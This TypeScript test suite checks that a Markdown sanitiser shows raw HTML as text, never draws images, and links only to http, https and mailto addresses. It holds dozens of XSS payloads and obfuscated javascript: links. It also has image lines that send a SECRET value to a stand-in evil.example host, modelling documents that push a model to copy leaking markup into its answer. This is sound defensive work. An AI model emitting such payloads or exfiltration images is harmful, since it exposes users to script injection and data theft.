/**
 * How a run's delivered answer becomes HTML for the thread.
 *
 * The answer is model output built from documents the run read. Its Markdown structure
 * is kept; raw HTML in it is shown as the characters written; an image is never drawn,
 * so an answer cannot make the browser fetch an address a document chose; a link is
 * drawn only for http, https and mailto. `runAnswerMarkup` is the Markdown step and needs
 * no DOM. `runAnswerHtml` adds DOMPurify, which does: only what it is told is checked here.
 */
import { readFileSync } from 'node:fs';
import { fileURLToPath } from 'node:url';

import { marked } from 'marked';
import { describe, expect, it } from 'vitest';

import {
	RUN_ANSWER_FORBIDDEN_ATTRS,
	RUN_ANSWER_FORBIDDEN_TAGS,
	escapeHtml,
	runAnswerMarkup
} from '../answer';
import { thread } from './fixtures';
import { HOSTILE_STRINGS, attributeValues, elementsIn } from './hostile';

/** What a browser shows for escaped text: the characters that were written. */
function decoded(html: string): string {
	return html
		.replace(/&lt;/g, '<')
		.replace(/&gt;/g, '>')
		.replace(/&quot;/g, '"')
		.replace(/&#39;/g, "'")
		.replace(/&amp;/g, '&');
}

/** The elements Markdown structure needs. */
const STRUCTURE = [
	'p',
	'h1',
	'h2',
	'h3',
	'h4',
	'h5',
	'h6',
	'ul',
	'ol',
	'li',
	'strong',
	'em',
	'del',
	'code',
	'pre',
	'blockquote',
	'hr',
	'br',
	'table',
	'thead',
	'tbody',
	'tr',
	'th',
	'td',
	'a'
];
const STRUCTURE_ATTRIBUTES = [
	'href',
	'title',
	'align',
	'start',
	'class',
	'checked',
	'disabled',
	'type'
];

/** The answer is made of nothing but structure, and any link goes to http, https or mailto. */
function expectOnlyStructure(html: string, label: string): void {
	for (const element of elementsIn(html)) {
		expect(STRUCTURE, `${label}: <${element.tag}> is not Markdown structure`).toContain(
			element.tag
		);
		for (const attribute of element.attributes) {
			expect(STRUCTURE_ATTRIBUTES, `${label}: ${attribute} on <${element.tag}>`).toContain(
				attribute
			);
		}
	}
	// The same, said the way the risks are named: no element that loads, runs or embeds anything,
	// no event handler on any element, and an address only for http, https and mailto.
	expect(html, `${label}: an element that loads, runs or embeds something`).not.toMatch(
		/<(?:img|script|iframe|svg|style|object|embed|form|link|meta|base|math|video|audio|source)\b/i
	);
	const names = elementsIn(html).flatMap((element) => element.attributes);
	expect(
		names.filter((name) => /^on\w+/.test(name)),
		`${label}: an event handler`
	).toEqual([]);
	expect(
		names.filter((name) =>
			['src', 'srcdoc', 'srcset', 'style', 'action', 'formaction'].includes(name)
		),
		`${label}: an attribute that loads or restyles`
	).toEqual([]);
	// The address of every link that was drawn.
	for (const address of attributeValues(html, 'href')) {
		expect(address, `${label}: a link to somewhere that is not http, https or mailto`).toMatch(
			/^(?:https?:|mailto:)/i
		);
	}
}

describe('escapeHtml', () => {
	it('writes the five characters that matter as entities', () => {
		expect(escapeHtml(`&<>"'`)).toBe('&amp;&lt;&gt;&quot;&#39;');
	});

	it('leaves everything else as it was', () => {
		expect(escapeHtml('Fees are due within thirty (30) days. [§2] — £5')).toBe(
			'Fees are due within thirty (30) days. [§2] — £5'
		);
		expect(escapeHtml('')).toBe('');
	});

	it.each(HOSTILE_STRINGS.map((text) => [text]))(
		'makes %s text, and the text it shows is the text it was given',
		(hostile) => {
			const escaped = escapeHtml(hostile);
			expect(escaped).not.toMatch(/[<>"']/);
			expect(decoded(escaped)).toBe(hostile);
			expect(elementsIn(escaped)).toEqual([]);
		}
	);
});

describe('runAnswerMarkup keeps the structure of an answer', () => {
	it('on the answer recorded for a run on documents', () => {
		const answer = thread('documents.completed')[1].content;
		const html = runAnswerMarkup(answer);
		expect(html).toContain('<h2>Payment and breach notice</h2>');
		expect(decoded(html)).toContain('"within thirty (30) days of the invoice date" (Source: [1])');
		expect(decoded(html)).toContain('"twelve months of fees" (Source: [1])');
		expectOnlyStructure(html, 'recorded answer');
	});

	it('for emphasis, lists, quotes, code, rules and tables', () => {
		const html = runAnswerMarkup(
			[
				'# One',
				'',
				'**strong** and *emphasis* and ~~struck~~ and `code`',
				'',
				'- a',
				'- b',
				'',
				'1. first',
				'2. second',
				'',
				'> quoted',
				'',
				'---',
				'',
				'```',
				'fenced',
				'```',
				'',
				'| a | b |',
				'|---|:-:|',
				'| 1 | 2 |'
			].join('\n')
		);
		for (const tag of [
			'h1',
			'strong',
			'em',
			'del',
			'code',
			'ul',
			'ol',
			'li',
			'blockquote',
			'hr',
			'pre',
			'table',
			'thead',
			'tbody',
			'th',
			'td'
		]) {
			expect(html, tag).toMatch(new RegExp(`<${tag}[ >/]`));
		}
		expectOnlyStructure(html, 'structure');
	});

	it('for no answer at all', () => {
		expect(runAnswerMarkup('')).toBe('');
		expect(runAnswerMarkup(undefined as unknown as string)).toBe('');
		expect(runAnswerMarkup(null as unknown as string)).toBe('');
	});
});

/** Markup a document could get a model to copy into its answer. */
const RAW_HTML = [
	'<b>bold</b>',
	'<img src=x onerror=alert(1)>',
	'<script>alert(1)</script>',
	'<div onclick="alert(1)">x</div>',
	'<iframe src="https://evil.example/"></iframe>',
	'<svg onload=alert(1)>',
	'<style>p { color: red }</style>',
	'<!-- hidden -->'
];

describe('each kind of raw HTML in an answer is shown as written, in a paragraph of its own and inside a sentence', () => {
	it.each(RAW_HTML.map((source) => [source]))('%s', (source) => {
		for (const markdown of [source, `Before ${source} after`]) {
			const html = runAnswerMarkup(markdown);
			expect(
				elementsIn(html).map((element) => element.tag),
				markdown
			).toEqual(['p']);
			expect(elementsIn(html)[0].attributes, markdown).toEqual([]);
			expect(decoded(html), markdown).toContain(source);
			expectOnlyStructure(html, markdown);
		}
	});
});

describe('HTML in an answer is shown as the characters that were written', () => {
	it('in a paragraph of its own', () => {
		expect(runAnswerMarkup('<img src=x onerror=alert(1)>')).toBe(
			'<p>&lt;img src=x onerror=alert(1)&gt;</p>\n'
		);
		expect(runAnswerMarkup('<script>alert(1)</script>')).toBe(
			'<p>&lt;script&gt;alert(1)&lt;/script&gt;</p>\n'
		);
	});

	it('in the middle of a sentence', () => {
		expect(runAnswerMarkup('Text <b>bold</b> and <img src=x onerror=alert(1)> end')).toBe(
			'<p>Text &lt;b&gt;bold&lt;/b&gt; and &lt;img src=x onerror=alert(1)&gt; end</p>\n'
		);
	});

	it('as a comment, and as a block around the text', () => {
		expect(runAnswerMarkup('before <!-- hidden --> after')).toBe(
			'<p>before &lt;!-- hidden --&gt; after</p>\n'
		);
		expect(elementsIn(runAnswerMarkup('<div onclick="alert(1)">\ntext\n</div>'))).toEqual([
			{ tag: 'p', attributes: [] }
		]);
	});

	it('in a table cell, a heading, a list item, a quote and a label', () => {
		const h = '<img src=x onerror=alert(1)>';
		for (const source of [
			`| a |\n|---|\n| ${h} |`,
			`## ${h}`,
			`- ${h}`,
			`> ${h}`,
			`**${h}**`,
			`[${h}](https://example.com)`
		]) {
			const html = runAnswerMarkup(source);
			expect(html, source).toContain('&lt;img src=x onerror=alert(1)&gt;');
			expect(
				elementsIn(html).map((element) => element.tag),
				source
			).not.toContain('img');
		}
	});

	it('in code, where Markdown already shows it as written', () => {
		const html = runAnswerMarkup(
			'`<img src=x onerror=alert(1)>`\n\n```\n<script>alert(1)</script>\n```'
		);
		expect(html).toContain('<code>&lt;img src=x onerror=alert(1)&gt;</code>');
		expect(html).toContain('&lt;script&gt;alert(1)&lt;/script&gt;');
		expect(elementsIn(html).map((element) => element.tag)).toEqual(['p', 'code', 'pre', 'code']);
	});

	it('so a fence’s language cannot carry an attribute out of its quotes', () => {
		const html = runAnswerMarkup('```js" onmouseover="alert(1)\ncode\n```');
		expect(elementsIn(html)).toEqual([
			{ tag: 'pre', attributes: [] },
			{ tag: 'code', attributes: ['class'] }
		]);
	});

	describe.each(HOSTILE_STRINGS.map((text) => [text]))('%s', (hostile) => {
		const asEscapedTitle = hostile.replace(/\\/g, '\\\\').replace(/"/g, '\\"');
		const contexts: [string, string][] = [
			['alone', hostile],
			['in a sentence', `Before ${hostile} after`],
			['in a heading', `## ${hostile}`],
			['in emphasis', `**${hostile}** and *${hostile}*`],
			['in a list item', `- ${hostile}\n- again`],
			['in a quote', `> ${hostile}`],
			['in a table cell', `| a |\n|---|\n| ${hostile} |`],
			['in a link label', `[${hostile}](https://example.com)`],
			['in a link title', `[x](https://example.com "${asEscapedTitle}")`],
			['as a link address', `[x](<${hostile}>)`],
			['as a bare link address', `[x](${hostile})`],
			['in an image’s description', `![${hostile}](https://evil.example/x.png)`],
			['as an image address', `![x](<${hostile}>)`],
			['as a reference', `[x][1]\n\n[1]: ${hostile}`],
			['as a code fence’s language', `\`\`\`${hostile}\ncode\n\`\`\``],
			['around other text', `<div>\n${hostile}\n</div>`]
		];

		it.each(contexts)(
			'%s: nothing but structure comes out, and no link leaves the page',
			(label, source) => {
				expectOnlyStructure(runAnswerMarkup(source), label);
			}
		);

		it('alone, it is shown, as text', () => {
			// Written as markup, it is shown as the characters written. Written as a link or an
			// entity, Markdown turns it into something else that is also text, so only markup is held to this.
			if (!hostile.includes('<') || hostile.startsWith('{@html')) return;
			expect(decoded(runAnswerMarkup(hostile))).toContain(hostile);
		});
	});
});

describe('an image is never drawn', () => {
	it('but shown as its Markdown, so the address a document chose is seen, not fetched', () => {
		const html = runAnswerMarkup('![leak](https://evil.example/c?d=SECRET&e=1 "title")');
		expect(html).toBe(
			'<p>![leak](https://evil.example/c?d=SECRET&amp;e=1 &quot;title&quot;)</p>\n'
		);
		expect(elementsIn(html).map((element) => element.tag)).toEqual(['p']);
	});

	it('whether it is written inline, by reference or inside a link', () => {
		for (const source of [
			'![x](https://evil.example/pixel.png)',
			'![x][1]\n\n[1]: https://evil.example/pixel.png',
			'[![x](https://evil.example/pixel.png)](https://example.com)',
			'![](https://evil.example/pixel.png)',
			'![x](data:image/svg+xml;base64,PHN2Zy8+)'
		]) {
			const html = runAnswerMarkup(source);
			expect(html, source).not.toMatch(/<img/i);
			expect(html, source).not.toMatch(/\ssrc\s*=/i);
		}
	});
});

describe('a link is drawn only for http, https and mailto', () => {
	it.each([
		['[ok](https://example.com/a?b=1)', 'https://example.com/a?b=1', 'ok'],
		['[ok](http://example.com)', 'http://example.com', 'ok'],
		['[ok](HTTPS://Example.com)', 'HTTPS://Example.com', 'ok'],
		['[mail](mailto:a@b.co)', 'mailto:a@b.co', 'mail'],
		['<https://example.com>', 'https://example.com', 'https://example.com'],
		['see https://example.com/x', 'https://example.com/x', 'https://example.com/x']
	])('%s', (source, address, label) => {
		const links = elementsIn(runAnswerMarkup(source)).filter((element) => element.tag === 'a');
		expect(links).toHaveLength(1);
		expect(runAnswerMarkup(source)).toContain(`<a href="${address}"`);
		expect(runAnswerMarkup(source)).toContain(`>${label}</a>`);
	});

	it.each([
		['[x](javascript:alert(1))', 'x (javascript:alert(1))'],
		['[x](JaVaScRiPt:alert(1))', 'x (JaVaScRiPt:alert(1))'],
		['[x](vbscript:msgbox(1))', 'x (vbscript:msgbox(1))'],
		[
			'[x](data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==)',
			'x (data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==)'
		],
		['[x](file:///etc/passwd)', 'x (file:///etc/passwd)'],
		['[x](ftp://example.com/f)', 'x (ftp://example.com/f)'],
		['[x](/lq-ai/admin)', 'x (/lq-ai/admin)'],
		['[x](//evil.example/)', 'x (//evil.example/)'],
		['[x](#top)', 'x (#top)'],
		['<javascript:alert(1)>', 'javascript:alert(1) (javascript:alert(1))'],
		['[x][1]\n\n[1]: javascript:alert(1)', 'x (javascript:alert(1))']
	])('%s is its label and address, as text', (source, shown) => {
		const html = runAnswerMarkup(source);
		expect(elementsIn(html).map((element) => element.tag)).toEqual(['p']);
		expect(decoded(html)).toBe(`<p>${shown}</p>\n`);
	});

	it('shows an address written with markup in it as text', () => {
		const html = runAnswerMarkup('[x](<ftp://a/b"c<d>)');
		expect(html).toBe('<p>x (ftp://a/b&quot;c&lt;d)</p>\n');
	});

	it('escapes a title, so it cannot leave its quotes', () => {
		const html = runAnswerMarkup('[x](https://a.example "t\\"><b>hi</b>")');
		expect(html).toBe(
			'<p><a href="https://a.example" title="t&quot;&gt;&lt;b&gt;hi&lt;/b&gt;">x</a></p>\n'
		);
		expect(elementsIn(html)).toEqual([
			{ tag: 'p', attributes: [] },
			{ tag: 'a', attributes: ['href', 'title'] }
		]);
	});

	it('draws an email address as a mailto link, and nothing the address carries leaves its quotes', () => {
		for (const source of ['<a@b.co>', 'user@example.com', '<mailto:x@y.z>']) {
			const links = attributeValues(runAnswerMarkup(source), 'href');
			expect(links, source).toHaveLength(1);
			expect(links[0], source).toMatch(/^mailto:/);
		}
		const quoted = runAnswerMarkup('<https://ok.example/"onmouseover="alert(1)>');
		expect(elementsIn(quoted).map((element) => element.attributes)).toEqual([[], ['href']]);
	});

	// A scheme written so that a filter might miss it, and a browser might not. None is drawn as a link.
	it.each([
		'[x]( javascript:alert(1))',
		'[x](  JaVaScRiPt:alert(1)  )',
		'[x](<  javascript:alert(1)  >)',
		'[x](<\tjavascript:alert(1)>)',
		'[x](< javascript:alert(1)>)',
		'[x](< javascript:alert(1)>)',
		'[x](java\tscript:alert(1))',
		'[x](<java\tscript:alert(1)>)',
		'[x](&#106;avascript:alert(1))',
		'[x](&#x6A;avascript:alert(1))',
		'[x](javascript&colon;alert(1))',
		'[x](javascript&#58;alert(1))',
		'[x](java&#x09;script:alert(1))',
		'[x](%6Aavascript:alert(1))',
		'[x](\u0001javascript:alert(1))',
		'[x](\u0000javascript:alert(1))',
		'[x](<vbscript:msgbox(1)>)',
		'[x](<  data:text/html,<script>alert(1)</script>>)',
		'[x][1]\n\n[1]: <  javascript:alert(1)>',
		'<JAVASCRIPT:alert(1)>',
		'<javascript://%0aalert(1)>'
	])('%j is not a link', (source) => {
		const html = runAnswerMarkup(source);
		expect(attributeValues(html, 'href'), source).toEqual([]);
		expect(
			elementsIn(html).map((element) => element.tag),
			source
		).not.toContain('a');
		expectOnlyStructure(html, source);
	});

	// The address is tested as written. Whitespace before it, inside <...>, would otherwise be drawn
	// as a link to %20%20https://ok.example, which is relative and resolves to a path under the page
	// (with enough ../, to any path on the site), not to the address that was written.
	describe('an address with space before it, inside <...>', () => {
		const SPACES: [string, string][] = [
			['two spaces', '  '],
			['a space', ' '],
			['a tab', '\t'],
			['a no-break space', ' '],
			['a line separator', ' '],
			['a byte order mark', '﻿'],
			['an ideographic space', '　']
		];
		const ADDRESSES = ['https://ok.example', 'HTTP://ok.example/a?b=1', 'mailto:a@b.co'];

		it.each(SPACES)(
			'after %s is shown as text, with the space in it, and is not a link',
			(_name, space) => {
				for (const address of ADDRESSES) {
					const source = `[x](<${space}${address}>)`;
					const html = runAnswerMarkup(source);
					expect(attributeValues(html, 'href'), JSON.stringify(source)).toEqual([]);
					expect(
						elementsIn(html).map((element) => element.tag),
						JSON.stringify(source)
					).toEqual(['p']);
					expect(decoded(html), JSON.stringify(source)).toBe(`<p>x (${space}${address})</p>\n`);
				}
			}
		);

		it('cannot be made to reach another path on the site with ../', () => {
			const html = runAnswerMarkup('[x](<  https://ok.example/../../../../lq-ai/admin>)');
			expect(attributeValues(html, 'href')).toEqual([]);
			expect(elementsIn(html).map((element) => element.tag)).toEqual(['p']);
		});

		it('is still a link when the space is only around the address outside the brackets, which Markdown trims', () => {
			for (const source of ['[x]( https://ok.example )', '[x](\thttps://ok.example\t)']) {
				expect(attributeValues(runAnswerMarkup(source), 'href'), JSON.stringify(source)).toEqual([
					'https://ok.example'
				]);
			}
		});

		it('is still a link when the space comes after it, since the address as written is absolute', () => {
			const hrefs = attributeValues(runAnswerMarkup('[x](<https://ok.example  >)'), 'href');
			expect(hrefs).toHaveLength(1);
			expect(hrefs[0]).toMatch(/^https:\/\/ok\.example/);
		});
	});
});

/**
 * Text and Markdown a document could try to get into an answer: schemes written to slip
 * past, markup in every place Markdown has, entities, and parser tricks. All of it must
 * come out as structure, with no live markup, no image and no link to anywhere but http,
 * https and mailto.
 */
const ADVERSARIAL = [
	'[x](<  https://ok.example>)',
	'[x](<\thttps://ok.example>)',
	'[x](< https://ok.example>)',
	'[x](<  https://ok.example/../../../../lq-ai/admin>)',
	'[x](https://ok.example/"onmouseover="alert(1))',
	'[x](<https://ok.example/"onmouseover="alert(1)>)',
	'[x](https://ok.example/<script>alert(1)</script>)',
	'[x](mailto:a@b.co?subject=<script>)',
	'[x](<mailto:"><script>alert(1)</script>>)',
	'[x](https://a.example \'single "double" quotes\')',
	'[x](https://a.example (paren title))',
	'[x](https://a.example "t\\" onmouseover=\\"alert(1)")',
	'[x][1]\n\n[1]: https://a.example "<script>alert(1)</script>"',
	'[x][1]\n\n[1]: <https://a.example/"onmouseover="x>',
	'<x@y.z"onmouseover="alert(1)>',
	'https://ok.example/"onmouseover="x',
	'www.ok.example/<script>alert(1)</script>',
	'<iframe src="javascript:alert(1)"></iframe>',
	'<svg><script>alert(1)</script></svg>',
	'<a href="javascript:alert(1)">x</a>',
	'<body onload=alert(1)>',
	'<math><mi//xlink:href="data:x,<script>alert(1)</script>">',
	'<form action="javascript:alert(1)"><input type=submit></form>',
	'<!--><img src=x onerror=alert(1)>-->',
	'<![CDATA[<img src=x onerror=alert(1)>]]>',
	'<?php echo 1 ?>',
	'<noscript><p title="</noscript><img src=x onerror=alert(1)>">',
	'<textarea><img src=x onerror=alert(1)></textarea>',
	'<plaintext><img src=x onerror=alert(1)>',
	'<xmp><img src=x onerror=alert(1)></xmp>',
	'<template><img src=x onerror=alert(1)></template>',
	'<object data="javascript:alert(1)"></object>',
	'<embed src="javascript:alert(1)">',
	'<link rel=stylesheet href="https://evil.example/x.css">',
	'<meta http-equiv=refresh content="0;url=javascript:alert(1)">',
	'<base href="https://evil.example/">',
	'<IMG SRC=x ONERROR=alert(1)>',
	'<img\nsrc=x\nonerror=alert(1)>',
	'<<img src=x onerror=alert(1)>',
	'<img/src=x/onerror=alert(1)>',
	'<scr<script>ipt>alert(1)</scr</script>ipt>',
	'[<img src=x onerror=alert(1)>](https://ok.example)',
	'![[a](https://b.example)](https://c.example/p.png)',
	'[![x](https://evil.example/p.png)](https://ok.example)',
	'**<img src=x onerror=alert(1)>**',
	'*<script>alert(1)</script>*',
	'~~<svg onload=alert(1)>~~',
	'`` ` <img src=x onerror=alert(1)> ` ``',
	'~~~<script>\n<img src=x onerror=alert(1)>\n~~~',
	'    <img src=x onerror=alert(1)>',
	'> <img src=x onerror=alert(1)>\n> [x](javascript:alert(1))',
	'Heading <img src=x onerror=alert(1)>\n===',
	'| a | b |\n|---|---|\n| [x](javascript:alert(1)) | ![y](https://evil.example/p.png) |',
	'- [x] <img src=x onerror=alert(1)>\n- [ ] [x](javascript:alert(1))',
	'\\<img src=x onerror=alert(1)>',
	'&lt;img src=x onerror=alert(1)&gt;',
	'&#60;img src=x onerror=alert(1)&#62;',
	'&amp;lt;img src=x onerror=alert(1)&amp;gt;',
	'![x](javascript:alert(1))',
	'![x]( <https://evil.example/p.png> )',
	'![x][1]\n\n[1]: javascript:alert(1)',
	'1. <img src=x onerror=alert(1)>\n   - nested [x](javascript:alert(1))',
	'<details><summary>x</summary><img src=x onerror=alert(1)></details>',
	'<div>\n\n[x](javascript:alert(1))\n\n</div>',
	'<div>\n\n![x](https://evil.example/p.png)\n\n</div>'
];

describe('nothing a document could write gets through the Markdown step as markup, an image or another scheme', () => {
	it.each(ADVERSARIAL.map((source) => [source]))('%j', (source) => {
		expectOnlyStructure(runAnswerMarkup(source), source);
	});

	it('and such text, as long as an answer can be, is read quickly and does not throw', () => {
		const cap = 16384;
		const heavy = [
			'['.repeat(cap),
			'<'.repeat(cap),
			'*'.repeat(cap),
			'`'.repeat(cap),
			'> '.repeat(cap / 2),
			'- '.repeat(cap / 2),
			'[a]('.repeat(cap / 4),
			'<a '.repeat(cap / 3)
		];
		for (const source of heavy) {
			expect(() => runAnswerMarkup(source), source.slice(0, 8)).not.toThrow();
		}
	});
});

describe('what the sanitiser is told', () => {
	// DOMPurify needs a DOM, so `runAnswerHtml` is not run here. What is checked is what it is called with.
	const source = readFileSync(fileURLToPath(new URL('../answer.ts', import.meta.url)), 'utf8')
		.replace(/\/\*[\s\S]*?\*\//g, '')
		.replace(/(^|\s)\/\/[^\n]*/g, '$1');

	it('is the Markdown step’s output, with the forbidden elements and attributes and nothing else', () => {
		const call =
			/DOMPurify\.sanitize\(\s*runAnswerMarkup\(content\)\s*,\s*\{([\s\S]*?)\}\s*\)/.exec(source);
		expect(call, 'the call to DOMPurify.sanitize').not.toBeNull();
		const options = [...call![1].matchAll(/([A-Z_]+)\s*:/g)].map((match) => match[1]);
		expect(options.sort()).toEqual(['FORBID_ATTR', 'FORBID_TAGS']);
		expect(call![1]).toMatch(/FORBID_TAGS:\s*RUN_ANSWER_FORBIDDEN_TAGS/);
		expect(call![1]).toMatch(/FORBID_ATTR:\s*RUN_ANSWER_FORBIDDEN_ATTRS/);
	});

	it('forbids every element that loads something, embeds something or takes input', () => {
		for (const tag of [
			'img',
			'picture',
			'source',
			'video',
			'audio',
			'track',
			'iframe',
			'object',
			'embed',
			'svg',
			'math',
			'style',
			'link',
			'form',
			'input',
			'button',
			'textarea',
			'select'
		]) {
			expect(RUN_ANSWER_FORBIDDEN_TAGS, tag).toContain(tag);
		}
		for (const tag of RUN_ANSWER_FORBIDDEN_TAGS) expect(tag).toBe(tag.toLowerCase());
	});

	it('forbids the attributes that load or restyle', () => {
		for (const attribute of ['style', 'srcset', 'background']) {
			expect(RUN_ANSWER_FORBIDDEN_ATTRS, attribute).toContain(attribute);
		}
	});

	it('does not forbid any element that Markdown structure needs', () => {
		for (const tag of STRUCTURE) {
			expect(RUN_ANSWER_FORBIDDEN_TAGS, tag).not.toContain(tag);
		}
	});

	it('keeps the ticks of a task list as text, with no form control', () => {
		const html = runAnswerMarkup('- [x] Notice was given\n- [ ] Cure period has run\n');
		expect(html).not.toMatch(/<input/i);
		expect(html).toContain('[x] Notice was given');
		expect(html).toContain('[ ] Cure period has run');
		// A loose list (blank lines between items) keeps them too.
		const loose = runAnswerMarkup('- [x] First\n\n- [ ] Second\n');
		expect(loose).not.toMatch(/<input/i);
		expect(loose).toMatch(/\[x\]\s+First/);
		expect(loose).toMatch(/\[ \]\s+Second/);
	});
});

describe('the checks above have teeth', () => {
	// Plain `marked`, which is what an ordinary reply goes through before DOMPurify, fails them.
	it.each([
		'<img src=x onerror=alert(1)>',
		'text <b>bold</b>',
		'[x](javascript:alert(1))',
		'![x](https://evil.example/pixel.png)',
		'<https://example.com> and <javascript:alert(1)>'
	])('%s', (source) => {
		const plain = marked.parse(source, { async: false }) as string;
		expect(() => expectOnlyStructure(plain, source)).toThrow();
		expect(() => expectOnlyStructure(runAnswerMarkup(source), source)).not.toThrow();
	});
});
